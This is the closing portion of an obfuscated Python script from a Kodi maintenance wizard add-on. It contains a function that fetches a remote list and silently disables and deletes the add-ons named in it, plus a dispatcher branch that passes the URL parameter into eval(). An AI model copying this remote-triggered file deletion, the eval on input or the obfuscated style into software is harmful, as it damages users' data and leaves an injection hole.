						for OOO0O0O0OO000O0O0 in O0OOO00OOO0OOOO0O :#line:5578
							os .unlink (os .path .join (O000OO0O00OOO0OO0 ,OOO0O0O0OO000O0O0 ))#line:5579
						for OO000O00OOO0O0O00 in O00O00000O0O000O0 :#line:5580
							shutil .rmtree (os .path .join (O000OO0O00OOO0OO0 ,OO000O00OOO0O0O00 ))#line:5581
					os .rmdir (OOOOO00O000O0000O )#line:5582
			xbmc .executebuiltin ('Container.Refresh')#line:5584
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5585
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5586
	except :pass #line:5587
def remove_addons2 ():#line:5588
	try :#line:5589
			import json #line:5590
			O000OO0OOO0OOO000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5591
			for OO0O000O0O0O0OOOO in O000OO0OOO0OOO000 :#line:5592
				OO000OO00O0O0OO0O =OO0O000O0O0O0OOOO .split (':')[1 ].strip ()#line:5594
				OO0OO0OO0OOO0OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO000OO00O0O0OO0O ,'false')#line:5595
				OOO00O00O0O0O0OO0 =xbmc .executeJSONRPC (OO0OO0OO0OOO0OOOO )#line:5596
				O0000O0O000O00O00 =json .loads (OOO00O00O0O0O0OO0 )#line:5597
				O0OO0O00O0O0000OO =os .path .join (user_folder ,OO000OO00O0O0OO0O )#line:5599
				if os .path .exists (O0OO0O00O0O0000OO ):#line:5601
					for OOO0OO0OOOO00OOOO ,OO000O0000O0O0O00 ,O00OO0O0O00O0O0O0 in os .walk (O0OO0O00O0O0000OO ):#line:5602
						for OO000000OOO0OO00O in O00OO0O0O00O0O0O0 :#line:5603
							os .unlink (os .path .join (OOO0OO0OOOO00OOOO ,OO000000OOO0OO00O ))#line:5604
						for O0000000000000OOO in OO000O0000O0O0O00 :#line:5605
							shutil .rmtree (os .path .join (OOO0OO0OOOO00OOOO ,O0000000000000OOO ))#line:5606
					os .rmdir (O0OO0O00O0O0000OO )#line:5607
	except :pass #line:5609
params =get_params ()#line:5610
url =None #line:5611
name =None #line:5612
mode =None #line:5613
try :mode =urllib .unquote_plus (params ["mode"])#line:5615
except :pass #line:5616
try :name =urllib .unquote_plus (params ["name"])#line:5617
except :pass #line:5618
try :url =urllib .unquote_plus (params ["url"])#line:5619
except :pass #line:5620
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5622
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5623
def setView (O0OOO000O0O0OOO0O ,O0000O0OO00OO0O00 ):#line:5624
	if wiz .getS ('auto-view')=='true':#line:5625
		O0OOO0OOO0OO0OOO0 =wiz .getS (O0000O0OO00OO0O00 )#line:5626
		if O0OOO0OOO0OO0OOO0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0OOO0OOO0OO0OOO0 ='55'#line:5627
		if O0OOO0OOO0OO0OOO0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0OOO0OOO0OO0OOO0 ='50'#line:5628
		wiz .ebi ("Container.SetViewMode(%s)"%O0OOO0OOO0OO0OOO0 )#line:5629
if mode ==None :index ()#line:5631
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5633
elif mode =='builds':buildMenu ()#line:5634
elif mode =='viewbuild':viewBuild (name )#line:5635
elif mode =='buildinfo':buildInfo (name )#line:5636
elif mode =='buildpreview':buildVideo (name )#line:5637
elif mode =='install':buildWizard (name ,url )#line:5638
elif mode =='theme':buildWizard (name ,mode ,url )#line:5639
elif mode =='viewthirdparty':viewThirdList (name )#line:5640
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5641
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5642
elif mode =='maint':maintMenu (name )#line:5644
elif mode =='passpin':passandpin ()#line:5645
elif mode =='backmyupbuild':backmyupbuild ()#line:5646
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5647
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5648
elif mode =='advancedsetting':advancedWindow (name )#line:5649
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5650
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5651
elif mode =='asciicheck':wiz .asciiCheck ()#line:5652
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5653
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5654
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5655
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5656
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5657
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5658
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5659
elif mode =='currentsettings':viewAdvanced ()#line:5660
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5661
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5662
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5663
elif mode =='fixskin':backtokodi ()#line:5664
elif mode =='testcommand':testcommand ()#line:5665
elif mode =='logsend':logsend ()#line:5666
elif mode =='rdon':rdon ()#line:5667
elif mode =='rdoff':rdoff ()#line:5668
elif mode =='setrd':setrealdebrid ()#line:5669
elif mode =='setrd2':setautorealdebrid ()#line:5670
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5671
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5672
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5673
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5674
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5675
elif mode =='freshstart':freshStart ()#line:5676
elif mode =='forceupdate':wiz .forceUpdate ()#line:5677
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5678
elif mode =='forceclose':wiz .killxbmc ()#line:5679
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5680
elif mode =='hidepassword':wiz .hidePassword ()#line:5681
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5682
elif mode =='enableaddons':enableAddons ()#line:5683
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5684
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5685
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5686
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5687
elif mode =='uploadlog':uploadLog .Main ()#line:5688
elif mode =='viewlog':LogViewer ()#line:5689
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5690
elif mode =='viewerrorlog':errorChecking (all =True )#line:5691
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5692
elif mode =='purgedb':purgeDb ()#line:5693
elif mode =='fixaddonupdate':fixUpdate ()#line:5694
elif mode =='removeaddons':removeAddonMenu ()#line:5695
elif mode =='removeaddon':removeAddon (name )#line:5696
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5697
elif mode =='removedata':removeAddonData (name )#line:5698
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5699
elif mode =='systeminfo':systemInfo ()#line:5700
elif mode =='restorezip':restoreit ('build')#line:5701
elif mode =='restoregui':restoreit ('gui')#line:5702
elif mode =='restoreaddon':restoreit ('addondata')#line:5703
elif mode =='restoreextzip':restoreextit ('build')#line:5704
elif mode =='restoreextgui':restoreextit ('gui')#line:5705
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5706
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5707
elif mode =='traktsync':traktsync ()#line:5708
elif mode =='apk':apkMenu (name )#line:5710
elif mode =='apkscrape':apkScraper (name )#line:5711
elif mode =='apkinstall':apkInstaller (name ,url )#line:5712
elif mode =='speed':speedMenu ()#line:5713
elif mode =='net':net_tools ()#line:5714
elif mode =='GetList':GetList (url )#line:5715
elif mode =='youtube':youtubeMenu (name )#line:5716
elif mode =='viewVideo':playVideo (url )#line:5717
elif mode =='addons':addonMenu (name )#line:5719
elif mode =='addoninstall':addonInstaller (name ,url )#line:5720
elif mode =='savedata':saveMenu ()#line:5722
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5723
elif mode =='managedata':manageSaveData (name )#line:5724
elif mode =='whitelist':wiz .whiteList (name )#line:5725
elif mode =='trakt':traktMenu ()#line:5727
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5728
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5729
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5730
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5731
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5732
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5733
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5734
elif mode =='realdebrid':realMenu ()#line:5736
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5737
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5738
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5739
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5740
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5741
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5742
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5743
elif mode =='login':loginMenu ()#line:5745
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5746
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5747
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5748
elif mode =='clearlogin':loginit .clearSaved (name )#line:5749
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5750
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5751
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5752
elif mode =='contact':notify .contact (CONTACT )#line:5754
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5755
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5756
elif mode =='developer':developer ()#line:5758
elif mode =='converttext':wiz .convertText ()#line:5759
elif mode =='createqr':wiz .createQR ()#line:5760
elif mode =='testnotify':testnotify ()#line:5761
elif mode =='testnotify2':testnotify2 ()#line:5762
elif mode =='servicemanual':servicemanual ()#line:5763
elif mode =='fastinstall':fastinstall ()#line:5764
elif mode =='testupdate':testupdate ()#line:5765
elif mode =='testfirst':testfirst ()#line:5766
elif mode =='testfirstrun':testfirstRun ()#line:5767
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5768
elif mode =='bg':wiz .bg_install (name ,url )#line:5770
elif mode =='bgcustom':wiz .bg_custom ()#line:5771
elif mode =='bgremove':wiz .bg_remove ()#line:5772
elif mode =='bgdefault':wiz .bg_default ()#line:5773
elif mode =='rdset':rdsetup ()#line:5774
elif mode =='mor':morsetup ()#line:5775
elif mode =='mor2':morsetup2 ()#line:5776
elif mode =='resolveurl':resolveurlsetup ()#line:5777
elif mode =='urlresolver':urlresolversetup ()#line:5778
elif mode =='forcefastupdate':forcefastupdate ()#line:5779
elif mode =='traktset':traktsetup ()#line:5780
elif mode =='placentaset':placentasetup ()#line:5781
elif mode =='flixnetset':flixnetsetup ()#line:5782
elif mode =='reptiliaset':reptiliasetup ()#line:5783
elif mode =='yodasset':yodasetup ()#line:5784
elif mode =='numbersset':numberssetup ()#line:5785
elif mode =='uranusset':uranussetup ()#line:5786
elif mode =='genesisset':genesissetup ()#line:5787
elif mode =='fastupdate':fastupdate ()#line:5788
elif mode =='folderback':folderback ()#line:5789
elif mode =='menudata':Menu ()#line:5790
elif mode ==2 :#line:5792
        wiz .torent_menu ()#line:5793
elif mode ==3 :#line:5794
        wiz .popcorn_menu ()#line:5795
elif mode ==8 :#line:5796
        wiz .metaliq_fix ()#line:5797
elif mode ==9 :#line:5798
        wiz .quasar_menu ()#line:5799
elif mode ==5 :#line:5800
        swapSkins ('skin.Premium.mod')#line:5801
elif mode ==13 :#line:5802
        wiz .elementum_menu ()#line:5803
elif mode ==16 :#line:5804
        wiz .fix_wizard ()#line:5805
elif mode ==17 :#line:5806
        wiz .last_play ()#line:5807
elif mode ==18 :#line:5808
        wiz .normal_metalliq ()#line:5809
elif mode ==19 :#line:5810
        wiz .fast_metalliq ()#line:5811
elif mode ==20 :#line:5812
        wiz .fix_buffer2 ()#line:5813
elif mode ==21 :#line:5814
        wiz .fix_buffer3 ()#line:5815
elif mode ==11 :#line:5816
        wiz .fix_buffer ()#line:5817
elif mode ==15 :#line:5818
        wiz .fix_font ()#line:5819
elif mode ==14 :#line:5820
        wiz .clean_pass ()#line:5821
elif mode ==22 :#line:5822
        wiz .movie_update ()#line:5823
elif mode =='adv_settings':buffer1 ()#line:5824
elif mode =='getpass':getpass ()#line:5825
elif mode =='setpass':setpass ()#line:5826
elif mode =='setuname':setuname ()#line:5827
elif mode =='passandUsername':passandUsername ()#line:5828
elif mode =='9':disply_hwr ()#line:5829
elif mode =='99':disply_hwr2 ()#line:5830
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))